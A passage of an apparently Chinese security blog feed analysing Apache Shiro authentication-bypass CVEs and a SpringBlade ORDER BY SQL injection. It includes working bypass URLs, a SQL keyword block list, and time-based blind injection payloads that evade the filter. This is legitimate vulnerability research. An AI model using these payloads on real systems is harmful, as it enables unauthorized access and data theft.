<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在CVE-2020-1957中的漏洞修复中提到<code>request.getServletPath</code>只返回Servlet实际的路径，但是<code>request.getContextPath</code>是能获取到分号<code>;</code>的。</p>
<p>于是访问：<a href="http://localhost:8011/shiro;/admin/page" target="_blank" rel="noopener">http://localhost:8011/shiro;/admin/page</a> 或 <a href="http://localhost:8011/;/shiro/admin/page" target="_blank" rel="noopener">http://localhost:8011/;/shiro/admin/page</a> ，实现绕过。</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request2-bypass.png" alt="burp-request2-bypass"></p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当传入<code>/shiro;/admin/page</code>时，<code>request.getContextPath</code>得到的是<code>/shiro;/</code>，<code>request.getServletPath</code>得到的是<code>/admin/page</code></p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/debug-getrequesturi2.png" alt="debug-getrequesturi2"></p>
<p><code>decodeAndCleanUriString</code>方法中的代码没有变动，还是删除<code>;</code>后面的内容进行，只获取<code>;</code>前的内容。</p>
<p>最后shiro得到的URI是<code>/shiro;</code>，不会匹配到身份认证校验规则，默认放行。</p>
<p>⚠️：<em>该绕过方式一定需要有context path的配置，如果没有系统没有设置context path，<code>request.getContextPath</code>默认为空。</em></p>
<br>

<p>除此之外，腾讯玄武实验室的Ruilin发现<a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">另一个绕过方法</a>。</p>
<p>shiro配置的规则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">map.put(&quot;&#x2F;manage&#x2F;*&quot;, &quot;authc&quot;);</span><br></pre></td></tr></table></figure>

<p>对应的Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/manage/&#123;name&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">manageName</span><span class="params">(@PathVariable String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"manage: "</span>+name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p><a href="http://localhost:8011/shiro/manage/test" target="_blank" rel="noopener">http://localhost:8011/shiro/manage/test</a></p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request3-normal.png" alt="burp-request3-normal"></p>
<br>

<p><a href="http://localhost:8011/shiro/manage/test%25%32%46test" target="_blank" rel="noopener">http://localhost:8011/shiro/manage/test%25%32%46test</a></p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request3-bypass.png" alt="burp-request3-bypass"></p>
<br>

<p>原因是在<code>decodeAndCleanUriString()</code>方法中存在<code>decodeRequestString</code>用于URL解码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> </span>&#123;</span><br><span class="line">	uri = decodeRequestString(request, uri);</span><br><span class="line">	<span class="keyword">int</span> semicolonIndex = uri.indexOf(<span class="string">';'</span>);</span><br><span class="line">	<span class="keyword">return</span> (semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shiro二次解码得到的是<code>/shiro/manage/test/test</code>，因为鉴权规则设置的是<code>/manage/*</code>一个星号，只匹配一层目录，<code>/shiro/manage/test/test</code>，算是两层目录，也就不属于<code>/manage/*</code>。而Spring解析时只会将URI解码一次，得到的是<code>/shiro/manage/test%2ftest</code>，从而绕过访问。</p>
<p>该绕过的场景更严苛一些，可利用场景稍少。</p>
<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方更改了URI的获取逻辑，使用移除分号后的<code>request.getRequestURI</code>和<code>request.getPathInfo()</code>进行URI拼接。并且没有用<code>decodeAndCleanUriString()</code>方法处理URI，避免了二次URL解码。</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/code-compare-webutils2.png" alt="code-compare-webutils2"></p>
<br>

<h1 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h1><p>该漏洞由蚂蚁非攻实验室codeplutos提交，具体可看<a href="https://lists.apache.org/thread.html/r539f87706094e79c5da0826030384373f0041068936912876856835f%40%3Cdev.shiro.apache.org%3E" target="_blank" rel="noopener">这里</a>。其中说到新增了<code>Global Filter</code>来缓解该漏洞。</p>
<p>漏洞存在于1.6.0版本之前，复现时将<code>pom.xml</code>中的shiro版本设置为1.5.3版本，该漏洞触发条件稍微苛刻一些，也是需要将请求映射成路径变量的形式。</p>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Controller对应代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/manage/&#123;name&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">manageName</span><span class="params">(@PathVariable String name)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"manage: "</span>+name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>访问：<a href="http://localhost:8011/shiro/manage/index" target="_blank" rel="noopener">http://localhost:8011/shiro/manage/index</a> ，302跳转到登录页面</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request4-normal.png" alt="burp-request4-normal"></p>
<p>访问：<a href="http://localhost:8011/shiro/manage/%3Bindex" target="_blank" rel="noopener">http://localhost:8011/shiro/manage/%3Bindex</a> ，绕过身份验证</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request4-bypass.png" alt="burp-request4-bypass"></p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看漏洞修复的<a href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d" target="_blank" rel="noopener">commit</a>，其中新增了一个全局过滤器，路径为<code>web/src/main/java/org/apache/shiro/web/filter/InvalidRequestFilter.java</code>，该过滤器对分号<code>;</code>、反斜杠<code>\</code>、和ascii不可打印字符的处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; SEMICOLON = Collections.unmodifiableList(Arrays.asList(<span class="string">";"</span>, <span class="string">"%3b"</span>, <span class="string">"%3B"</span>));</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; BACKSLASH = Collections.unmodifiableList(Arrays.asList(<span class="string">"\\"</span>, <span class="string">"%5c"</span>, <span class="string">"%5C"</span>));</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">containsOnlyPrintableAsciiCharacters</span><span class="params">(String uri)</span> </span>&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">if</span> (c &lt; <span class="string">'\u0020'</span> || c &gt; <span class="string">'\u007e'</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isAccessAllowed</span><span class="params">(ServletRequest request, ServletResponse response, Object mappedValue)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	String uri = WebUtils.toHttp(request).getRequestURI();</span><br><span class="line">	<span class="keyword">return</span> !containsSemicolon(uri)</span><br><span class="line">		&amp;&amp; !containsBackslash(uri)</span><br><span class="line">		&amp;&amp; !containsNonAsciiCharacters(uri);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">onAccessDenied</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	WebUtils.toHttp(response).sendError(<span class="number">400</span>, <span class="string">"Invalid request"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>当<code>WebUtils.toHttp(request).getRequestURI()</code>获取到的URI存在分号<code>;</code>、反斜杠<code>\</code>、ascii不可打印字符时，抛出400错误。</p>
<p>当我们传入<code>/manage/%3Bindex</code>时，shiro得到的是<code>/manage/</code></p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/debug-evaluate.png" alt="debug-evaluate"></p>
<p>而spring得到的是<code>/manage/;index</code>，<code>;index</code>作为<code>{name}</code>参数</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/debug-spring-getlookuppathforrequest.png" alt="debug-spring-getlookuppathforrequest"></p>
<p>所以能绕过shiro的身份认证</p>
<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>把shiro版本设置成1.6.0，再次访问，此时URI中存在分号<code>;</code>，返回400错误。</p>
<p><img src="/2020/08/20/Shiro_Authentication_Bypass/burp-request5-normal.png" alt="burp-request5-normal"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://shiro.apache.org/security-reports.html" target="_blank" rel="noopener">https://shiro.apache.org/security-reports.html</a></p>
<p><a href="https://l3yx.github.io/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/" target="_blank" rel="noopener">https://l3yx.github.io/2020/06/30/Shiro-权限绕过漏洞-CVE-2020-11989/</a></p>
<p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a></p>
<p><a href="https://lists.apache.org/thread.html/r539f87706094e79c5da0826030384373f0041068936912876856835f%40%3Cdev.shiro.apache.org%3E" target="_blank" rel="noopener">https://lists.apache.org/thread.html/r539f87706094e79c5da0826030384373f0041068936912876856835f%40%3Cdev.shiro.apache.org%3E</a></p>
]]></content>
  </entry>
  <entry>
    <title>SpringBlade中“隐藏”的SQL注入</title>
    <url>/2020/08/01/SpringBlade_SQLi/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>某人在SpringBlade中提了一个<a href="https://github.com/chillzhuang/SpringBlade/issues/9" target="_blank" rel="noopener">issue</a>说明项目存在SQL注入漏洞</p>
<p>这个项目在我之前分析网关的未授权访问时就看了一遍SQL语句，在<code>*mapper.xml</code>中看了一圈并没有发现注入点，但是看到有人提出了SQL注入于是决定深入探查一下该SQL注入原因。</p>
<p>如果你看到这篇文章，可以自己尝试阅读代码，看能否找到注入点。如果能自己独立找到，那么这篇文章也就不必往下看了。</p>
<a id="more"></a>

<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p><a href="https://github.com/chillzhuang/SpringBlade/issues/9" target="_blank" rel="noopener">issue</a>中提到注入点URL为<code>/api/blade-log/api/list?ascs=time and ascii(substring(user() from 1))=97</code></p>
<p>找到对应的代码文件路径<code>SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/controller/LogApiController.java</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LogApiController.java</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/list"</span>)</span><br><span class="line"><span class="keyword">public</span> R&lt;IPage&lt;LogApiVo&gt;&gt; list(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestParam</span> Map&lt;String, Object&gt; log, Query query) &#123;</span><br><span class="line">	IPage&lt;LogApi&gt; pages = logService.page(Condition.getPage(query.setDescs(<span class="string">"create_time"</span>)), Condition.getQueryWrapper(log, LogApi<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">	List&lt;LogApiVo&gt; records = pages.getRecords().stream().map(logApi -&gt; &#123;</span><br><span class="line">		LogApiVo vo = BeanUtil.copy(logApi, LogApiVo<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		vo.setStrId(Func.toStr(logApi.getId()));</span><br><span class="line">		<span class="keyword">return</span> vo;</span><br><span class="line">	&#125;).collect(Collectors.toList());</span><br><span class="line">	IPage&lt;LogApiVo&gt; pageVo = <span class="keyword">new</span> Page&lt;&gt;(pages.getCurrent(), pages.getSize(), pages.getTotal());</span><br><span class="line">	pageVo.setRecords(records);</span><br><span class="line">	<span class="keyword">return</span> R.data(pageVo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注意传入<code>list</code>方法中的<code>Query</code>，<code>Query</code>是组件自带的类，其中有四个值（<code>current</code>、<code>size</code>、<code>ascs</code>、<code>descs</code>）是可以通过前端用户传入进行赋值的。<code>current</code>和<code>size</code>是integer类型，只能传入数字，无法进行SQL注入，<code>ascs</code>和<code>descs</code>则是string类型，可以传入任意字符。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Query.java</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Accessors</span>(chain = <span class="keyword">true</span>)</span><br><span class="line"><span class="meta">@ApiModel</span>(description = <span class="string">"查询条件"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(value = <span class="string">"当前页"</span>)</span><br><span class="line">	<span class="keyword">private</span> Integer current;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(value = <span class="string">"每页的数量"</span>)</span><br><span class="line">	<span class="keyword">private</span> Integer size;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(hidden = <span class="keyword">true</span>)</span><br><span class="line">	<span class="keyword">private</span> String ascs;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@ApiModelProperty</span>(hidden = <span class="keyword">true</span>)</span><br><span class="line">	<span class="keyword">private</span> String descs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>例如传入<code>/api/list?current=7&amp;size=77&amp;ascs=seikei&amp;descs=s31k31</code>时，<code>query</code>中参数分别被赋值成<code>Query(current=7, size=77, ascs=seikei, descs=create_time)</code></p>
<p>调试过程中<code>query</code>中的变量如下</p>
<p><img src="/2020/08/01/SpringBlade_SQLi/query-variables.png" alt="query-variables"></p>
<p>回到<code>list</code>方法，其中第二行，将<code>query</code>传入<code>Condition</code>，其中<code>query.setDescs</code>被设置为<code>create_time</code>，所以<code>descs</code>参数就不可控了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">IPage&lt;LogApi&gt; pages = logService.page(Condition.getPage(query.setDescs(<span class="string">"create_time"</span>)), Condition.getQueryWrapper(log, LogApi<span class="class">.<span class="keyword">class</span>))</span>;</span><br></pre></td></tr></table></figure>

<p>调试追到<code>Condition</code>中可以看到<code>query</code>的值，<code>descs</code>被置为<code>create_time</code>，<code>ascs</code>还是我们传入的值</p>
<p><img src="/2020/08/01/SpringBlade_SQLi/condition-query.png" alt="condition-query"></p>
<p><code>Condition.IPage()</code>方法中第二、三行有个<code>SqlKeyword.filter()</code>，其中过滤了一些常见的SQL注入关键字，但是非常容易绕过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">filter</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> param == <span class="keyword">null</span> ? <span class="keyword">null</span> : param.replaceAll(<span class="string">"(?i)'|%|--|insert|delete|select|count|group|union|drop|truncate|alter|grant|execute|exec|xp_cmdshell|call|declare|sql"</span>, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>Condition</code>被赋值之后到<code>logService.page()</code>，追到<code>LogAPIService</code>，<code>SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/service/impl/LogApiServiceImpl.java</code></p>
<p>但是service中没有任何内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogApiServiceImpl</span> <span class="keyword">extends</span> <span class="title">ServiceImpl</span>&lt;<span class="title">LogApiMapper</span>, <span class="title">LogApi</span>&gt; <span class="keyword">implements</span> <span class="title">ILogApiService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看看<code>LogApiMapper</code>（<code>SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/mapper/LogApiMapper.java</code>），同样其中也没什么内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">LogApiMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">LogApi</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>/SpringBlade/blade-service/blade-log/src/main/java/org/springblade/core/log/mapper/LogApiMapper.xml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="meta-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"org.springblade.core.log.mapper.LogApiMapper"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- 通用查询映射结果 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"logResultMap"</span> <span class="attr">type</span>=<span class="string">"org.springblade.core.log.model.LogApi"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"create_time"</span> <span class="attr">property</span>=<span class="string">"createTime"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"service_id"</span> <span class="attr">property</span>=<span class="string">"serviceId"</span>/&gt;</span></span><br><span class="line">		......</span><br><span class="line">	<span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- 通用查询结果列 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"baseColumnList"</span>&gt;</span></span><br><span class="line">		select id,</span><br><span class="line">		create_time AS createTime,</span><br><span class="line">		service_id, server_host, server_ip, env, type, title, method, request_uri, user_agent, remote_ip, method_class, method_name, params, time, create_by</span><br><span class="line">	<span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意其中<code>&lt;sql&gt;</code>标签，其中的语句是没有<code>from</code>和其他内容，仅仅只有<code>select</code>中的内容，没有<code>from</code>，甚至没有参数插入的地方，和常见mybatis配置文件中的SQL语句不一样。</p>
<p>现在发现SQL语句中并没有插入<code>ascs</code>参数的地方，带着疑问，实际测试来看看是否这里真的存在SQL注入？</p>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>首先开启mysql的日志记录，方便我们进行测试。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'general%'</span>;   <span class="comment"># 查看日志开启状态和日志存储位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">GLOBAL</span> general_log=<span class="string">'ON'</span>;      <span class="comment"># 若未开启日志，也就是general_log为OFF，则设置为ON</span></span><br></pre></td></tr></table></figure>

<p>开启日志后使用<code>tail -f /var/lib/mysql/mysql.log</code>查看mysql日志。</p>
<p>查看<code>blade_log_api</code>表中是否存在数据，没有的话使用自己随便添加几条数据，方便我们后续测试。</p>
<blockquote>
<p><code>blade_log_api</code>表中有数据存在这点是必须的，因为程序使用mybatis plus在真正的SQL执行前会执行<code>SELECT COUNT(1) FROM blade_log_api</code>查看表中是否存在数据，若不存在数据则不会执行真正要执行的SQL。</p>
</blockquote>
<br>

<p>我们传入<code>http://localhost:8103/api/list?current=7&amp;size=77&amp;ascs=seikei&amp;descs=s31k31</code>，会在mysql日志中看到如下两条语句被执行</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(<span class="number">1</span>) <span class="keyword">FROM</span> blade_log_api</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">type</span>, title, service_id, server_ip, server_host, env, remote_ip, user_agent, request_uri, method, method_class, method_name, params, <span class="built_in">time</span>, create_by, create_time </span><br><span class="line"><span class="keyword">FROM</span> blade_log_api </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> seikei <span class="keyword">ASC</span>, create_time <span class="keyword">DESC</span> <span class="keyword">LIMIT</span> <span class="number">462</span>,<span class="number">77</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>ascs</code>参数是在SQL语句中回显的</p>
<br>

<p>访问<code>http://localhost:8103/api/list?ascs=time+and+sleep(5)</code>试试注入效果，发现返回延迟了五秒</p>
<p>数据库日志为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">type</span>, title, service_id, server_ip, server_host, env, remote_ip, user_agent, request_uri, method, method_class, method_name, params, <span class="built_in">time</span>, create_by, create_time </span><br><span class="line"><span class="keyword">FROM</span> blade_log_api </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="built_in">time</span> <span class="keyword">and</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">ASC</span>, create_time <span class="keyword">DESC</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure>

<br>

<p>经过测试，除了<code>SqlKeyword.filter()</code>中过滤的字符，还有不能使用逗号，因为mybatis plus会在每个逗号前添加<code>ASC</code>，导致SQL执行错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 传入内容</span><br><span class="line">time RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))&#x3D;51) THEN 0x74696d65 ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; SQL执行内容</span><br><span class="line">time RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS NCHAR) ASC, 0x20) FROM INFORMATION_SCHEMA.SCHEMATA) ASC, 1 ASC, 1))&#x3D;51) THEN 0x74696d65 ELSE 0x28 END)) ASC, create_time DESC LIMIT ?,?</span><br></pre></td></tr></table></figure>



<p>所以需要使用无逗号的函数进行注入</p>
<p>判断语句使用：<code>select case when (条件) then 代码1 else 代码2 end</code></p>
<p>截取字符串使用：<code>select substring(user() from 1 for 4)</code></p>
<p>只截取一个字符可以省略<code>for</code>，变成<code>substring(user()) from 1</code></p>
<br>

<p>绕过<code>SqlKeyword.filter()</code>中过滤的字符和逗号，可以使用以下payload（当然还有很多种构造payload的方式，我这里只给出最普通的payload）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ascs&#x3D;(selselectect+case+when(ascii(substring(user()+from+1))%3d114)+then+sleep(2)+end)</span><br></pre></td></tr></table></figure>

<p>更换获取<code>user()</code>的位置，并不断修改ascii的值进行遍历，根据延迟就能得到<code>user()</code>完整的值。</p>
<br>

<p>来看看issue提交者给出的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;api&#x2F;blade-log&#x2F;api&#x2F;list?ascs&#x3D;time and ascii(substring(user() from 1))&#x3D;97</span><br></pre></td></tr></table></figure>

<p>payload非常精简，用<code>time</code>字段排序成功与否来看<code>ascii(substring(user() from 1))=97</code>表达式是否正确。若<code>user()</code>第一个字符的ascii码等于97时，返回结果中的<code>time</code>字段是由小到大排序的。</p>
<p>但这个payload有几个缺陷</p>
<ul>
<li>无法广泛适用（需要根据排序值进行判断，编写脚本很难把各种场景做到统一）</li>
<li>容易误报（若正好结果中<code>time</code>从小到大排序就会产生误报）</li>
<li>和数据库版本有关（我在mysql8.0.19中测试order by表达式是不生效的，其他数据库暂未测试）</li>
<li>若是黑盒测试不知道数据库字段名，无法构造payload</li>
</ul>
<h1 id="再次分析"><a href="#再次分析" class="headerlink" title="再次分析"></a>再次分析</h1><p>既然能成功注入，那为什么在代码中没有看到相应的SQL语句呢？</p>
<p>先说结论：Mybatis Plus中已经有写好的分页查询，传入<code>Page</code>和<code>QueryWrapper</code>即可自动构建成SQL语句，而SpringBlade为了灵活加上了多个可变参数，导致用户传入的参数被添加到SQL语句<code>order by</code>之后，导致SQL注入产生。这就是为什么在“可见”的代码中看不到SQL语句拼接，因为压根没用到本地的Mybatis Mapper配置文件中的sql语句。</p>
<br>

<p>在“可见”的代码中没有找到SQL拼接，我的第一反应就是调用了类库导致的，但是为什么会将用户输入的ascs参数拼接到SQL语句这一点没有弄明白，下面是我个人的分析过程。</p>
<p>经过一段时间的调试，大概搞懂了整个过程的逻辑，SQL执行前的调用栈如下</p>
<p><img src="/2020/08/01/SpringBlade_SQLi/debug-mybatis.png" alt="debug-mybatis"></p>
<p>调用栈中看到，在<code>LogApiServiceImpl#page()</code>方法之后，全部都是在类库中执行的，只看代码是看不出任何SQL拼接迹象的。</p>
<blockquote>
<p> ⚠️：若想理解整个过程需要去看<a href="https://github.com/chillzhuang/blade-tool" target="_blank" rel="noopener">SpringBlade Core</a>和<a href="https://github.com/baomidou/mybatis-plus" target="_blank" rel="noopener">Mybatis Plus</a>的源码</p>
</blockquote>
<p><code>LogApiController</code>中的<code>logService</code>是<code>ILogApiService</code>类，继承自Mybatis Plus中的<code>IService</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ILogApiService.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ILogApiService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">LogApi</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ILogApiService</code>中是没有重写任何方法的，所以<code>LogApiController</code>中执行的<code>logService.page()</code>最终会调用<code>IService.page()</code>。</p>
<p><a href="https://github.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/service/IService.java" target="_blank" rel="noopener">IService</a>源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 翻页查询</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> page         翻页对象</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> queryWrapper 实体对象封装操作类 &#123;<span class="doctag">@link</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">default</span> &lt;E extends IPage&lt;T&gt;&gt; <span class="function">E <span class="title">page</span><span class="params">(E page, Wrapper&lt;T&gt; queryWrapper)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> getBaseMapper().selectPage(page, queryWrapper);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>到了<code>IService.page()</code>之后就是Mybatis Plus内的各种方法调用，以及SQL语句的构造等，不涉及用户传入参数的变更，就不在此赘述，想了解Mybatis Plus的执行过程可以独立分析一下。</p>
<p>找到执行SQL查询的方法后，就是要查明参数是怎么传入的，我们来看<code>page</code>和<code>queryWrapper</code>。</p>
